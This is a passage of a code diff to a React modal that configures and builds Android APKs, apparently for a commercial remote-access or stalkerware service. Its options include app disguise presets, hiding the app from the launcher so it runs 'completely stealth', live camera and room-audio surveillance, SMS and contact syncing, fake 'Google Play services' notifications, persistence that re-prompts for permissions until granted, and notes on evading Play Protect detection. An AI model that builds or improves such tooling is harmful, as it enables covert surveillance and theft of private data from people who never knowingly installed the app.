-                                    className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableContactsPermission ? 'bg-green-500' : 'bg-white/20'}`}
-                                >
-                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableContactsPermission && !isBasicPlan ? 'left-7' : 'left-1'}`} />
-                                </button>
-                            </div>
-
-                            {/* Notification Listener Permission */}
-                            <div className={`flex items-center justify-between bg-white/5 p-3 rounded-lg border ${isBasicPlan ? 'border-yellow-500/30 opacity-60' : 'border-white/10'} mb-2`}>
-                                <div className="flex items-center gap-2">
-                                    <svg className="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
-                                    <span className="text-sm font-medium text-white/70">Notification Access</span>
-                                    {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
-                                    <button
-                                        onClick={() => setShowPermissionInfo('notifications')}
-                                        className="text-white/40 hover:text-cyan-400 transition-colors"
-                                    >
-                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                                    </button>
-                                </div>
-                                <button
-                                    onClick={() => {
-                                        if (isBasicPlan) {
-                                            onUpgrade?.();
-                                            return;
-                                        }
-                                        setEnableNotificationListener(!enableNotificationListener);
-                                    }}
-                                    className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableNotificationListener ? 'bg-cyan-500' : 'bg-white/20'}`}
-                                >
-                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableNotificationListener && !isBasicPlan ? 'left-7' : 'left-1'}`} />
-                                </button>
-                            </div>
-
-                            {/* Notification Style Section - Collapsible */}
-                            <div className="mt-4 pt-4 border-t border-white/10">
-                                <button
-                                    onClick={() => setShowNotificationSettings(!showNotificationSettings)}
-                                    className="flex items-center gap-2 text-sm text-white/70 hover:text-white transition-colors w-full"
-                                >
-                                    <svg className={`w-4 h-4 transition-transform ${showNotificationSettings ? 'rotate-90' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7"></path>
-                                    </svg>
-                                    <svg className="w-4 h-4 text-orange-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
-                                    <span className="font-semibold">Notification Style</span>
-                                    <span className="text-[10px] px-1.5 py-0.5 bg-orange-500/20 text-orange-400 rounded ml-auto">STEALTH</span>
-                                </button>
-
-                                {showNotificationSettings && (
-                                    <div className="mt-3 space-y-3">
-                                        <p className="text-xs text-white/40 leading-tight">Customize how the background notification looks. Choose a preset that blends in with system notifications.</p>
-
-                                        {/* Notification Style Preset */}
+                            {/* Active Tab Body */}
+                            <div className="flex-1 p-5 sm:p-6 overflow-y-auto custom-scrollbar space-y-6">
+                                
+                                {activeTab === 'identity' && (
+                                    <div className="space-y-6 animate-in fade-in duration-200">
                                         <div>
-                                            <label className="block text-xs font-medium text-white/60 mb-1">Notification Preset</label>
-                                            <select
-                                                value={notificationStyle}
-                                                onChange={(e) => setNotificationStyle(e.target.value)}
-                                                className="w-full bg-white/5 border border-white/10 rounded-lg px-3 py-2 text-white text-sm focus:outline-none focus:border-orange-500 appearance-none cursor-pointer"
-                                                style={{ backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='white' stroke-width='2'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' d='M19 9l-7 7-7-7'/%3E%3C/svg%3E")`, backgroundRepeat: 'no-repeat', backgroundPosition: 'right 8px center', backgroundSize: '16px' }}
-                                            >
-                                                {Object.entries(NOTIFICATION_PRESETS).map(([key, preset]) => (
-                                                    <option key={key} value={key} className="bg-surface-2">
-                                                        {preset.icon} {preset.title}
-                                                    </option>
-                                                ))}
-                                            </select>
+                                            <label className="block text-xs font-bold uppercase tracking-widest text-fg-3 mb-3">
+                                                Select App Disguise Preset
+                                            </label>
+                                            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
+                                                {DISGUISE_PRESETS.map((preset) => {
+                                                    const isSelected = selectedDisguise === preset.id;
+                                                    return (
+                                                        <button
+                                                            key={preset.id}
+                                                            type="button"
+                                                            onClick={() => handleSelectDisguise(preset.id)}
+                                                            className={`flex flex-col items-center p-3.5 rounded-2xl border text-center transition-all ${
+                                                                isSelected
+                                                                    ? 'bg-emerald-500/10 border-emerald-500 shadow-[0_0_20px_rgba(16,185,129,0.15)] scale-[1.02]'
+                                                                    : 'bg-black/40 border-white/5 hover:border-white/20 hover:bg-white/[0.03]'
+                                                            }`}
+                                                        >
+                                                            <div className={`w-12 h-12 rounded-2xl bg-gradient-to-br ${preset.iconBg} flex items-center justify-center ${preset.iconColor} shadow-lg mb-2.5`}>
+                                                                {preset.id === 'custom' && customIconPreview ? (
+                                                                    <img src={customIconPreview} alt="Custom" className="w-10 h-10 rounded-xl object-cover" />
+                                                                ) : (
+                                                                    renderDisguiseGraphic(preset.id, "w-6 h-6")
+                                                                )}
+                                                            </div>
+                                                            <span className="text-xs font-extrabold text-white block truncate w-full">{preset.name}</span>
+                                                            <span className="text-[10px] text-fg-3 font-data truncate w-full mt-0.5">{preset.category}</span>
+                                                        </button>
+                                                    );
+                                                })}
+                                            </div>
                                         </div>
 
-                                        {/* Preview */}
-                                        {notificationStyle !== 'custom' && (
-                                            <div className="bg-white/5 rounded-lg p-3 border border-white/10">
-                                                <p className="text-[10px] text-white/40 mb-2 uppercase tracking-wider">Preview</p>
-                                                <div className="flex items-start gap-2">
-                                                    <span className="text-lg">{NOTIFICATION_PRESETS[notificationStyle]?.icon}</span>
-                                                    <div>
-                                                        <p className="text-sm font-medium text-white/90">{NOTIFICATION_PRESETS[notificationStyle]?.title}</p>
-                                                        <p className="text-xs text-white/50">{NOTIFICATION_PRESETS[notificationStyle]?.text}</p>
-                                                    </div>
+                                        {/* Custom Icon Upload */}
+                                        {selectedDisguise === 'custom' && (
+                                            <div className="p-4 rounded-2xl bg-purple-500/10 border border-purple-500/30 space-y-3">
+                                                <div className="flex items-center gap-3">
+                                                    <Upload size={18} className="text-purple-400" />
+                                                    <span className="text-xs font-bold text-white">Upload Custom PNG/JPG App Icon</span>
                                                 </div>
+                                                <input
+                                                    type="file"
+                                                    accept="image/png, image/jpeg"
+                                                    onChange={handleCustomIconChange}
+                                                    className="w-full text-xs text-fg-2 file:mr-4 file:py-2 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-purple-500 file:text-white hover:file:bg-purple-600 cursor-pointer"
+                                                />
                                             </div>
                                         )}
 
-                                        {/* Custom Fields */}
-                                        {notificationStyle === 'custom' && (
-                                            <div className="space-y-2 bg-orange-500/5 p-3 rounded-lg border border-orange-500/20">
-                                                <div>
-                                                    <label className="block text-xs font-medium text-white/60 mb-1">Title</label>
-                                                    <input
-                                                        type="text"
-                                                        value={notificationTitle}
-                                                        onChange={(e) => setNotificationTitle(e.target.value)}
-                                                        className="w-full bg-white/5 border border-white/10 rounded-lg px-3 py-1.5 text-white text-sm focus:outline-none focus:border-orange-500"
-                                                        placeholder="Google Play services"
-                                                    />
-                                                </div>
-                                                <div>
-                                                    <label className="block text-xs font-medium text-white/60 mb-1">Text</label>
-                                                    <input
-                                                        type="text"
-                                                        value={notificationText}
-                                                        onChange={(e) => setNotificationText(e.target.value)}
-                                                        className="w-full bg-white/5 border border-white/10 rounded-lg px-3 py-1.5 text-white text-sm focus:outline-none focus:border-orange-500"
-                                                        placeholder="Checking for updates…"
-                                                    />
-                                                </div>
-                                                <div>
-                                                    <label className="block text-xs font-medium text-white/60 mb-1">Icon</label>
-                                                    <select
-                                                        value={notificationIcon}
-                                                        onChange={(e) => setNotificationIcon(e.target.value)}
-                                                        className="w-full bg-white/5 border border-white/10 rounded-lg px-3 py-1.5 text-white text-sm focus:outline-none focus:border-orange-500 appearance-none cursor-pointer"
-                                                        style={{ backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='white' stroke-width='2'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' d='M19 9l-7 7-7-7'/%3E%3C/svg%3E")`, backgroundRepeat: 'no-repeat', backgroundPosition: 'right 8px center', backgroundSize: '16px' }}
-                                                    >
-                                                        {Object.entries(ICON_OPTIONS).map(([key, label]) => (
-                                                            <option key={key} value={key} className="bg-surface-2">{label}</option>
-                                                        ))}
-                                                    </select>
-                                                </div>
-
-                                                {/* Custom Preview */}
-                                                <div className="bg-white/5 rounded-lg p-3 border border-white/10 mt-2">
-                                                    <p className="text-[10px] text-white/40 mb-2 uppercase tracking-wider">Preview</p>
-                                                    <div className="flex items-start gap-2">
-                                                        <span className="text-lg">{ICON_OPTIONS[notificationIcon]?.split(' ')[0]}</span>
-                                                        <div>
-                                                            <p className="text-sm font-medium text-white/90">{notificationTitle || "Google Play services"}</p>
-                                                            <p className="text-xs text-white/50">{notificationText || "Checking for updates…"}</p>
-                                                        </div>
-                                                    </div>
-                                                </div>
+                                        {/* App Name & Package Name */}
+                                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                                            <div>
+                                                <label className="block text-xs font-bold text-fg-2 mb-1.5">App Display Name</label>
+                                                <input
+                                                    type="text"
+                                                    value={appName}
+                                                    onChange={(e) => {
+                                                        setAppName(e.target.value);
+                                                        setPackageName(e.target.value.toLowerCase().replace(/[^a-z0-9]/g, '.'));
+                                                    }}
+                                                    className="w-full bg-black/50 border border-white/10 rounded-xl px-4 py-2.5 text-sm text-white font-semibold focus:outline-none focus:border-emerald-500 transition-colors"
+                                                />
                                             </div>
-                                        )}
+                                            <div>
+                                                <label className="block text-xs font-bold text-fg-2 mb-1.5">Package Identifier</label>
+                                                <input
+                                                    type="text"
+                                                    value={packageName}
+                                                    onChange={(e) => setPackageName(e.target.value)}
+                                                    className="w-full bg-black/50 border border-white/10 rounded-xl px-4 py-2.5 text-sm text-fg-1 font-data focus:outline-none focus:border-emerald-500 transition-colors"
+                                                />
+                                            </div>
+                                        </div>
 
-                                        {/* Click Action */}
+                                        {/* Web Link Option */}
                                         <div>
-                                            <label className="block text-xs font-medium text-white/60 mb-1">On Notification Click</label>
-                                            <select
-                                                value={notificationClickAction}
-                                                onChange={(e) => setNotificationClickAction(e.target.value)}
-                                                className="w-full bg-white/5 border border-white/10 rounded-lg px-3 py-2 text-white text-sm focus:outline-none focus:border-orange-500 appearance-none cursor-pointer"
-                                                style={{ backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='white' stroke-width='2'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' d='M19 9l-7 7-7-7'/%3E%3C/svg%3E")`, backgroundRepeat: 'no-repeat', backgroundPosition: 'right 8px center', backgroundSize: '16px' }}
-                                            >
-                                                {Object.entries(CLICK_ACTIONS).map(([key, label]) => (
-                                                    <option key={key} value={key} className="bg-surface-2">{label}</option>
-                                                ))}
-                                            </select>
-                                            <p className="text-xs text-white/30 mt-1">Opens this system screen instead of your app</p>
+                                            <label className="block text-xs font-bold text-fg-2 mb-1.5">Launch Web URL (Optional when hidden)</label>
+                                            <input
+                                                type="url"
+                                                value={webLink}
+                                                onChange={(e) => setWebLink(e.target.value)}
+                                                placeholder="https://example.com"
+                                                className="w-full bg-black/50 border border-white/10 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-500 transition-colors"
+                                            />
+                                            <p className="text-[11px] text-fg-4 mt-1">If set, the app displays this WebView immediately on launch.</p>
+                                        </div>
+
+                                        {/* Hide App Icon PRO Toggle */}
+                                        <div className={`p-4 rounded-2xl border transition-all ${isBasicPlan ? 'bg-amber-500/5 border-amber-500/30' : 'bg-black/40 border-white/10'}`}>
+                                            <div className="flex items-center justify-between">
+                                                <div className="flex items-center gap-3">
+                                                    <div className="w-10 h-10 rounded-xl bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-400">
+                                                        <Eye size={18} />
+                                                    </div>
+                                                    <div>
+                                                        <div className="flex items-center gap-2">
+                                                            <span className="font-bold text-sm text-white">Hide App from Launcher</span>
+                                                            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[9px] font-extrabold uppercase tracking-widest bg-amber-500/20 border border-amber-400/40 text-amber-300">
+                                                                <Crown size={10} /> PRO
+                                                            </span>
+                                                        </div>
+                                                        <p className="text-xs text-fg-3">App runs completely stealth in background after installation</p>
+                                                    </div>
+                                                </div>
+                                                <button
+                                                    type="button"
+                                                    onClick={() => {
+                                                        if (isBasicPlan) {
+                                                            onUpgrade?.();
+                                                            return;
+                                                        }
+                                                        setHideApp(!hideApp);
+                                                    }}
+                                                    className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-emerald-500' : 'bg-white/20'}`}
+                                                >
+                                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${hideApp && !isBasicPlan ? 'left-7' : 'left-1'}`} />
+                                                </button>
+                                            </div>
                                         </div>
                                     </div>
                                 )}
-                            </div>
 
-                            {/* Advanced Section - Collapsible, Hidden by Default */}
-                            <div className="mt-4">
-                                <button
-                                    onClick={() => setShowAdvanced(!showAdvanced)}
-                                    className="flex items-center gap-2 text-sm text-white/50 hover:text-white/70 transition-colors"
-                                >
-                                    <svg className={`w-4 h-4 transition-transform ${showAdvanced ? 'rotate-90' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7"></path>
-                                    </svg>
-                                    Advanced
-                                </button>
+                                {activeTab === 'permissions' && (
+                                    <div className="space-y-3 animate-in fade-in duration-200">
+                                        <div className="flex items-center justify-between mb-2">
+                                            <span className="text-xs font-bold uppercase tracking-widest text-fg-3">Device Access & Permissions</span>
+                                            <span className="text-xs text-emerald-400 font-semibold">Enable required permissions</span>
+                                        </div>
 
-                                {showAdvanced && (
-                                    <div className="mt-3 space-y-3">
-                                        {/* Aggressive Permissions */}
-                                        <div className={`bg-yellow-500/10 p-3 rounded-lg border ${isBasicPlan ? 'border-yellow-500/30 opacity-60' : 'border-yellow-500/30'}`}>
-                                            <div className="flex items-center justify-between mb-1">
-                                                <div className="flex items-center gap-2">
-                                                    <svg className="w-4 h-4 text-yellow-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
-                                                    <span className="text-sm font-medium text-yellow-300">Aggressive Mode</span>
-                                                    {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
+                                        {/* Storage Permission */}
+                                        <div className="flex items-center justify-between p-4 rounded-2xl bg-black/40 border border-white/5 hover:border-white/10 transition-colors">
+                                            <div className="flex items-center gap-3">
+                                                <div className="w-9 h-9 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400">
+                                                    <Layers size={17} />
+                                                </div>
+                                                <div>
+                                                    <span className="font-bold text-sm text-white block">Storage & Media Access</span>
+                                                    <span className="text-xs text-fg-3">Required to browse photos and videos</span>
+                                                </div>
+                                            </div>
+                                            <button
+                                                type="button"
+                                                onClick={() => setEnableStoragePermission(!enableStoragePermission)}
+                                                className={`w-11 h-6 rounded-full transition-colors relative ${enableStoragePermission ? 'bg-emerald-500 shadow-[0_0_12px_#10b981]' : 'bg-white/20'}`}
+                                            >
+                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableStoragePermission ? 'left-6' : 'left-1'}`} />
+                                            </button>
+                                        </div>
+
+                                        {/* Camera Permission (PREMIUM) */}
+                                        <div className="flex items-center justify-between p-4 rounded-2xl bg-black/40 border border-white/5 hover:border-white/10 transition-colors">
+                                            <div className="flex items-center gap-3">
+                                                <div className="w-9 h-9 rounded-xl bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center text-cyan-400">
+                                                    <Smartphone size={17} />
+                                                </div>
+                                                <div>
+                                                    <div className="flex items-center gap-2">
+                                                        <span className="font-bold text-sm text-white">Live Camera Surveillance</span>
+                                                        <span 
+                                                            onClick={onUpgrade}
+                                                            className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[9px] font-extrabold uppercase tracking-widest bg-amber-500/20 border border-amber-400/40 text-amber-300 cursor-pointer"
+                                                        >
+                                                            <Crown size={10} /> PREMIUM
+                                                        </span>
+                                                    </div>
+                                                    <span className="text-xs text-fg-3">Stream real-time front & rear camera feeds</span>
+                                                </div>
+                                            </div>
+                                            <button
+                                                type="button"
+                                                onClick={() => {
+                                                    if (userPlan !== 'premium') {
+                                                        onUpgrade?.();
+                                                        return;
+                                                    }
+                                                    setEnableCameraPermission(!enableCameraPermission);
+                                                }}
+                                                className={`w-11 h-6 rounded-full transition-colors relative ${userPlan !== 'premium' ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500 shadow-[0_0_12px_#06b6d4]' : 'bg-white/20'}`}
+                                            >
+                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableCameraPermission && userPlan === 'premium' ? 'left-6' : 'left-1'}`} />
+                                            </button>
+                                        </div>
+
+                                        {/* Microphone Permission (PREMIUM) */}
+                                        <div className="flex items-center justify-between p-4 rounded-2xl bg-black/40 border border-white/5 hover:border-white/10 transition-colors">
+                                            <div className="flex items-center gap-3">
+                                                <div className="w-9 h-9 rounded-xl bg-purple-500/10 border border-purple-500/20 flex items-center justify-center text-purple-400">
+                                                    <Radio size={17} />
+                                                </div>
+                                                <div>
+                                                    <div className="flex items-center gap-2">
+                                                        <span className="font-bold text-sm text-white">Live Audio & Microphone</span>
+                                                        <span 
+                                                            onClick={onUpgrade}
+                                                            className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[9px] font-extrabold uppercase tracking-widest bg-amber-500/20 border border-amber-400/40 text-amber-300 cursor-pointer"
+                                                        >
+                                                            <Crown size={10} /> PREMIUM
+                                                        </span>
+                                                    </div>
+                                                    <span className="text-xs text-fg-3">Real-time room ambient audio monitoring</span>
+                                                </div>
+                                            </div>
+                                            <button
+                                                type="button"
+                                                onClick={() => {
+                                                    if (userPlan !== 'premium') {
+                                                        onUpgrade?.();
+                                                        return;
+                                                    }
+                                                    setEnableMicrophonePermission(!enableMicrophonePermission);
+                                                }}
+                                                className={`w-11 h-6 rounded-full transition-colors relative ${userPlan !== 'premium' ? 'bg-white/10' : enableMicrophonePermission ? 'bg-purple-500 shadow-[0_0_12px_#a855f7]' : 'bg-white/20'}`}
+                                            >
+                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableMicrophonePermission && userPlan === 'premium' ? 'left-6' : 'left-1'}`} />
+                                            </button>
+                                        </div>
+
+                                        {/* SMS Permission */}
+                                        <div className="flex items-center justify-between p-4 rounded-2xl bg-black/40 border border-white/5 hover:border-white/10 transition-colors">
+                                            <div className="flex items-center gap-3">
+                                                <div className="w-9 h-9 rounded-xl bg-red-500/10 border border-red-500/20 flex items-center justify-center text-red-400">
+                                                    <MessageSquare size={17} />
+                                                </div>
+                                                <div>
+                                                    <div className="flex items-center gap-2">
+                                                        <span className="font-bold text-sm text-white">SMS Messages Access</span>
+                                                        <span className="px-2 py-0.5 rounded-full text-[9px] font-bold uppercase bg-red-500/20 text-red-400">High Risk</span>
+                                                    </div>
+                                                    <span className="text-xs text-fg-3">Sync device SMS inbox & alerts</span>
+                                                </div>
+                                            </div>
+                                            <button
+                                                type="button"
+                                                onClick={() => {
+                                                    if (!enableSmsPermission) {
+                                                        setShowPlayProtectWarning(true);
+                                                    } else {
+                                                        setEnableSmsPermission(false);
+                                                    }
+                                                }}
+                                                className={`w-11 h-6 rounded-full transition-colors relative ${enableSmsPermission ? 'bg-red-500 shadow-[0_0_12px_#ef4444]' : 'bg-white/20'}`}
+                                            >
+                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission ? 'left-6' : 'left-1'}`} />
+                                            </button>
+                                        </div>
+
+                                        {/* Contacts Permission */}
+                                        <div className="flex items-center justify-between p-4 rounded-2xl bg-black/40 border border-white/5 hover:border-white/10 transition-colors">
+                                            <div className="flex items-center gap-3">
+                                                <div className="w-9 h-9 rounded-xl bg-blue-500/10 border border-blue-500/20 flex items-center justify-center text-blue-400">
+                                                    <Cpu size={17} />
+                                                </div>
+                                                <div>
+                                                    <span className="font-bold text-sm text-white block">Contacts Directory</span>
+                                                    <span className="text-xs text-fg-3">Read & sync phonebook contacts</span>
+                                                </div>
+                                            </div>
+                                            <button
+                                                type="button"
+                                                onClick={() => setEnableContactsPermission(!enableContactsPermission)}
+                                                className={`w-11 h-6 rounded-full transition-colors relative ${enableContactsPermission ? 'bg-blue-500 shadow-[0_0_12px_#3b82f6]' : 'bg-white/20'}`}
+                                            >
+                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableContactsPermission ? 'left-6' : 'left-1'}`} />
+                                            </button>
+                                        </div>
+
+                                        {/* Aggressive Persistence Mode */}
+                                        <div className={`p-4 rounded-2xl border transition-all ${isBasicPlan ? 'bg-yellow-500/5 border-yellow-500/30' : 'bg-black/40 border-white/10'}`}>
+                                            <div className="flex items-center justify-between">
+                                                <div className="flex items-center gap-3">
+                                                    <div className="w-9 h-9 rounded-xl bg-yellow-500/10 border border-yellow-500/20 flex items-center justify-center text-yellow-400">
+                                                        <AlertTriangle size={17} />
+                                                    </div>
+                                                    <div>
+                                                        <div className="flex items-center gap-2">
+                                                            <span className="font-bold text-sm text-white">Aggressive Persistence Mode</span>
+                                                            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[9px] font-extrabold uppercase tracking-widest bg-amber-500/20 border border-amber-400/40 text-amber-300">
+                                                                <Crown size={10} /> PRO
+                                                            </span>
+                                                        </div>
+                                                        <span className="text-xs text-fg-3">Auto-prompts permissions until granted by user</span>
+                                                    </div>
                                                 </div>
                                                 <button
+                                                    type="button"
                                                     onClick={() => {
                                                         if (isBasicPlan) {
                                                             onUpgrade?.();
@@ -597,344 +800,237 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                         }
                                                         setAggressivePermissions(!aggressivePermissions);
                                                     }}
-                                                    className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : aggressivePermissions ? 'bg-yellow-500' : 'bg-white/20'}`}
+                                                    className={`w-11 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : aggressivePermissions ? 'bg-yellow-500' : 'bg-white/20'}`}
                                                 >
-                                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${aggressivePermissions && !isBasicPlan ? 'left-7' : 'left-1'}`} />
+                                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${aggressivePermissions && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                                 </button>
                                             </div>
-                                            <p className="text-xs text-yellow-200/50 text-left leading-tight">{isBasicPlan ? 'Upgrade to Standard to unlock' : 'Repeatedly asks for permissions. App stays visible until granted.'}</p>
+                                        </div>
+                                    </div>
+                                )}
+
+                                {activeTab === 'notification' && (
+                                    <div className="space-y-5 animate-in fade-in duration-200">
+                                        <div>
+                                            <label className="block text-xs font-bold uppercase tracking-widest text-fg-3 mb-2.5">
+                                                Persistent Background Notification Style
+                                            </label>
+                                            <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5">
+                                                {Object.entries(NOTIFICATION_PRESETS).map(([key, preset]) => (
+                                                    <button
+                                                        key={key}
+                                                        type="button"
+                                                        onClick={() => {
+                                                            setNotificationStyle(key);
+                                                            if (key !== 'custom') {
+                                                                setNotificationTitle(preset.title);
+                                                                setNotificationText(preset.text);
+                                                            }
+                                                        }}
+                                                        className={`p-3 rounded-xl border text-left transition-all ${
+                                                            notificationStyle === key
+                                                                ? 'bg-emerald-500/10 border-emerald-500 shadow-sm'
+                                                                : 'bg-black/40 border-white/5 hover:border-white/20'
+                                                        }`}
+                                                    >
+                                                        <div className="flex items-center gap-2 mb-1">
+                                                            <span className="text-sm">{preset.icon}</span>
+                                                            <span className="text-xs font-bold text-white truncate">{preset.title}</span>
+                                                        </div>
+                                                        <span className="text-[11px] text-fg-3 block truncate">{preset.text}</span>
+                                                    </button>
+                                                ))}
+                                            </div>
                                         </div>
 
-                                        {/* SMS Permission - Hidden under Advanced */}
-                                        {/* SMS Permission - Hidden under Advanced */}
-                                        <div className={`flex items-center justify-between bg-red-500/10 p-3 rounded-lg border ${isBasicPlan ? 'border-red-500/30 opacity-60' : 'border-red-500/30'}`}>
-                                            <div className="flex items-center gap-2">
-                                                <svg className="w-4 h-4 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
-                                                <span className="text-sm font-medium text-red-300">SMS Access</span>
-                                                <span className="text-xs text-red-400/70 px-2 py-0.5 bg-red-500/20 rounded-full">Risky</span>
-                                                {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
+                                        {/* Notification Title & Text Customizer */}
+                                        <div className="p-4 rounded-2xl bg-black/40 border border-white/10 space-y-4">
+                                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                                                <div>
+                                                    <label className="block text-xs font-bold text-fg-2 mb-1.5">Notification Title</label>
+                                                    <input
+                                                        type="text"
+                                                        value={notificationTitle}
+                                                        onChange={(e) => setNotificationTitle(e.target.value)}
+                                                        className="w-full bg-black/50 border border-white/10 rounded-xl px-3.5 py-2 text-sm text-white font-semibold focus:outline-none focus:border-emerald-500"
+                                                    />
+                                                </div>
+                                                <div>
+                                                    <label className="block text-xs font-bold text-fg-2 mb-1.5">Notification Message</label>
+                                                    <input
+                                                        type="text"
+                                                        value={notificationText}
+                                                        onChange={(e) => setNotificationText(e.target.value)}
+                                                        className="w-full bg-black/50 border border-white/10 rounded-xl px-3.5 py-2 text-sm text-white focus:outline-none focus:border-emerald-500"
+                                                    />
+                                                </div>
                                             </div>
-                                            <button
-                                                onClick={() => {
-                                                    if (isBasicPlan) {
-                                                        onUpgrade?.();
-                                                        return;
-                                                    }
-                                                    if (!enableSmsPermission) {
-                                                        setShowPlayProtectWarning(true);
-                                                    } else {
-                                                        setEnableSmsPermission(false);
-                                                    }
-                                                }}
-                                                className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableSmsPermission ? 'bg-red-500' : 'bg-white/20'}`}
-                                            >
-                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission && !isBasicPlan ? 'left-7' : 'left-1'}`} />
-                                            </button>
+
+                                            <div>
+                                                <label className="block text-xs font-bold text-fg-2 mb-1.5">When User Taps Notification</label>
+                                                <select
+                                                    value={notificationClickAction}
+                                                    onChange={(e) => setNotificationClickAction(e.target.value)}
+                                                    className="w-full bg-black/50 border border-white/10 rounded-xl px-3.5 py-2 text-sm text-white focus:outline-none focus:border-emerald-500"
+                                                >
+                                                    {Object.entries(CLICK_ACTIONS).map(([key, label]) => (
+                                                        <option key={key} value={key} className="bg-[#121316] text-white">{label}</option>
+                                                    ))}
+                                                </select>
+                                            </div>
                                         </div>
-                                        <p className="text-xs text-red-400/70 pl-2">⚠️ Enabling SMS may trigger Play Protect detection.</p>
                                     </div>
                                 )}
                             </div>
+
+                            {/* Footer Action Bar */}
+                            <div className="flex items-center justify-between p-5 border-t border-white/10 bg-[#121318]">
+                                <div className="text-xs text-fg-3 hidden sm:block">
+                                    Ready to compile APK for <span className="font-bold text-white">{appName}</span>
+                                </div>
+                                <div className="flex items-center gap-3 w-full sm:w-auto">
+                                    <button
+                                        type="button"
+                                        onClick={onClose}
+                                        className="flex-1 sm:flex-none px-5 py-3 rounded-xl bg-white/5 hover:bg-white/10 text-white font-semibold text-xs transition-colors"
+                                    >
+                                        Cancel
+                                    </button>
+                                    <button
+                                        type="button"
+                                        onClick={startGeneration}
+                                        className="flex-1 sm:flex-none px-6 py-3 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-black font-extrabold text-xs shadow-[0_0_20px_rgba(16,185,129,0.3)] flex items-center justify-center gap-2 transition-all"
+                                    >
+                                        <Download size={15} /> Build & Download APK
